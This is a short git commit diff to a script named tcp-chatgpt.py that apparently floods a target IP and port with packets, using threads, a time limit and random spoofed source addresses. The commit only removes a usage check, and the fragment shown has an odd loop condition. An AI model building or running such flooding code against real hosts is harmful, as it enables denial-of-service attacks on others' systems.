075e9f66c0fd53f719d455f3b577c04be69ce495
Pulse <72387902+cintagram@users.noreply.github.com>
2023-03-18 21:29:41 +0900

    Update tcp-chatgpt.py

--- tcp-chatgpt.py
+++ tcp-chatgpt.py
@@ -9,12 +9,7 @@ port = int(sys.argv[2])
 tim1 = int(sys.argv[3])
 thread = int(sys.argv[4])
 
-def start():
-    if len(sys.argv) != 3:
-        print("Usage: {} <Target IP> <Port> <Time> <Thread>".format(sys.argv[0]))
-        sys.exit(1)
-
-    
+def start():    
     counter = 0
     while counter == tim1*10:
         source_ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
